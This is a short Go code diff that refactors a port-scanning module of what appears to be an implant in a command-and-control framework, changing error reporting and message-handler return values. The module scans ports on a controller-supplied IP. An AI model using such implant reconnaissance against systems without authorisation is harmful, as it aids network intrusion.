@@ -49,7 +49,7 @@ func (settings settings) portscan(portscan *messages.PortScan, callback func(*me
 		settings.state.scanning = false
 	} else {
 		if settings.state.scanning {
-			callback(&messages.ImplantReply{Module: settings.ID(), Args: []byte("Already running")})
+			callback(&messages.ImplantReply{Module: settings.ID(), Error: types.ERR_PORTSCAN_RUNNING})
 		} else {
 			wg := sync.WaitGroup{}
 
@@ -62,7 +62,8 @@ func (settings settings) portscan(portscan *messages.PortScan, callback func(*me
 					defer settings.state.lock.Release(1)
 					defer wg.Done()
 					if ScanPort(portscan.Ip, port, time.Second/4) {
-						callback(&messages.ImplantReply{Module: settings.ID(), Portscan: &messages.PortScanReply{Status: messages.PortScanReply_IN_PROGRESS, Found: int32(port)}})
+						portscan_reply := &messages.PortScanReply{Status: messages.PortScanReply_IN_PROGRESS, Found: int32(port)}
+						callback(&messages.ImplantReply{Module: settings.ID(), Portscan: portscan_reply})
 					}
 				}(int(port))
 			}
@@ -74,14 +75,14 @@ func (settings settings) portscan(portscan *messages.PortScan, callback func(*me
 	}
 }
 
-func (settings settings) HandleMessage(message *messages.CheckCmdReply, callback func(*messages.ImplantReply)) {
+func (settings settings) HandleMessage(message *messages.CheckCmdReply, callback func(*messages.ImplantReply)) bool {
 	portscan := message.GetPortscan()
 	if portscan == nil {
-		return
+		return false
 	}
 
 	go settings.portscan(portscan, callback)
-
+	return true
 }
 
 // Init the state of this module
